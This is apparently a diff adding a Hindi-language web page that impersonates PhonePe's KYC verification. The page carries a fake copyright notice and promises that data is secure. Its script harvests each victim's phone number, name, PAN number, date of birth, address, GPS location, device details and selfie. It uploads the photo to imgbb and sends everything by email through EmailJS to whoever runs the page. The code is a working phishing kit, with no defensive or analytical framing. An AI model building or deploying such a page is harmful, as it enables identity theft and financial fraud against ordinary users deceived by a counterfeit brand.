+      imgForm.append('key', IMGBB_API_KEY);
+      imgForm.append('image', photoDataUrl.split(',')[1]); // base64 only
+      imgForm.append('name', ref);
+      const imgRes = await fetch('https://api.imgbb.com/1/upload', {
+        method: 'POST', body: imgForm
+      });
+      if (!imgRes.ok) throw new Error('PHOTO_UPLOAD_FAILED');
+      const imgData = await imgRes.json();
+      photoLink = imgData.data.url;
+    }
+
+    // ── Send email via EmailJS ────────────────────────────
+    if (EMAILJS_SERVICE_ID === 'YOUR_SERVICE_ID') {
+      // Placeholder mode — simulate success
+      await new Promise(r => setTimeout(r, 1000));
+    } else {
+      const payload = {
+        service_id: EMAILJS_SERVICE_ID,
+        template_id: EMAILJS_TEMPLATE_ID,
+        user_id: EMAILJS_PUBLIC_KEY,
+        template_params: {
+          ref: formData.ref,
+          phone: formData.phone,
+          name: formData.name,
+          pan: formData.pan,
+          dob: formData.dob,
+          address: formData.address,
+          location_lat: formData.location.lat,
+          location_lng: formData.location.lng,
+          location_accuracy: formData.location.accuracy,
+          device_info: JSON.stringify(formData.device, null, 2),
+          photo_url: photoLink,
+          submitted_at: new Date().toLocaleString('en-IN'),
+        }
+      };
+      const emailRes = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!emailRes.ok) {
+        const errText = await emailRes.text();
+        throw new Error('EMAIL_FAILED:' + emailRes.status + ':' + errText);
+      }
+    }
+
+    // ── Success ───────────────────────────────────────────
+    document.getElementById('refNum').textContent = formData.ref;
+    setStep(4);
+
+  } catch (err) {
+    document.getElementById('submitBtn').disabled = false;
+    document.getElementById('submitText').textContent = '✅ KYC सबमिट करें';
+    document.getElementById('submitSpinner').style.display = 'none';
+
+    let msg = 'सबमिट नहीं हो पाया। कृपया दोबारा कोशिश करें।';
+    if (err.message === 'PHOTO_UPLOAD_FAILED') {
+      msg = 'फोटो अपलोड नहीं हो पाई। इंटरनेट कनेक्शन चेक करें और दोबारा कोशिश करें।';
+    } else if (err.message.startsWith('EMAIL_FAILED:413')) {
+      msg = 'डेटा बहुत बड़ा है (413 error)। ImgBB API key सेट करें ताकि फोटो अलग से अपलोड हो।';
+    } else if (err.message.startsWith('EMAIL_FAILED:401') || err.message.startsWith('EMAIL_FAILED:403')) {
+      msg = 'EmailJS credentials गलत हैं (401/403 error)। Service ID, Template ID और Public Key चेक करें।';
+    } else if (err.message.startsWith('EMAIL_FAILED')) {
+      msg = 'Email नहीं भेजा जा सका। EmailJS credentials और template चेक करें। Error: ' + err.message;
+    } else if (!navigator.onLine) {
+      msg = 'इंटरनेट कनेक्शन नहीं है। WiFi या Mobile Data चेक करें और दोबारा कोशिश करें।';
+    }
+
+    document.getElementById('permWarnMsg').textContent = msg;
+    document.getElementById('permWarn').classList.add('show');
+    document.getElementById('permWarn').scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+}
+</script>
+<!-- HINDI KYC STEPS GUIDE -->
+<div class="steps-guide">
+  <div class="steps-guide-header">
+    <span>📋</span>
+    <h3>KYC कैसे करें? — आसान स्टेप्स</h3>
+  </div>
+  <div class="steps-guide-body">
+
+    <div class="guide-step">
+      <div class="guide-num">1</div>
+      <div class="guide-content">
+        <div class="guide-title">📱 मोबाइल नंबर डालें</div>
+        <div class="guide-desc">अपना PhonePe में रजिस्टर्ड 10 अंकों का मोबाइल नंबर डालें और "वेरिफाई करें" बटन दबाएं।</div>
+      </div>
+    </div>
+    <div class="guide-divider"></div>
+
+    <div class="guide-step">
+      <div class="guide-num">2</div>
+      <div class="guide-content">
+        <div class="guide-title">📝 जानकारी भरें</div>
+        <div class="guide-desc">अपना पूरा नाम, PAN कार्ड नंबर, जन्म तिथि और पूरा पता भरें। सभी जानकारी सरकारी दस्तावेज़ के अनुसार होनी चाहिए।</div>
+      </div>
+    </div>
+    <div class="guide-divider"></div>
+
+    <div class="guide-step">
+      <div class="guide-num">3</div>
+      <div class="guide-content">
+        <div class="guide-title">📸 सेल्फी लें</div>
+        <div class="guide-desc">कैमरा और लोकेशन की अनुमति दें। अच्छी रोशनी में सीधे कैमरे की तरफ देखें और फोटो लें।</div>
+      </div>
+    </div>
+    <div class="guide-divider"></div>
+
+    <div class="guide-step">
+      <div class="guide-num">4</div>
+      <div class="guide-content">
+        <div class="guide-title">✅ KYC सबमिट करें</div>
+        <div class="guide-desc">"KYC सबमिट करें" बटन दबाएं। आपकी KYC 24 घंटे में अप्रूव हो जाएगी।</div>
+      </div>
+    </div>
+
+    <div class="guide-tip">
+      <div class="guide-tip-icon">💡</div>
+      <div class="guide-tip-text">
+        <strong>ज़रूरी चीज़ें तैयार रखें:</strong> PAN कार्ड, अच्छी रोशनी, इंटरनेट कनेक्शन, और कैमरा + लोकेशन की अनुमति।
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="footer-note">🔒 यह एक सुरक्षित वेरिफिकेशन प्रक्रिया है। आपकी जानकारी पूरी तरह सुरक्षित है।<br/>© 2024 PhonePe. All rights reserved.</div>
+
+</body>
+</html>
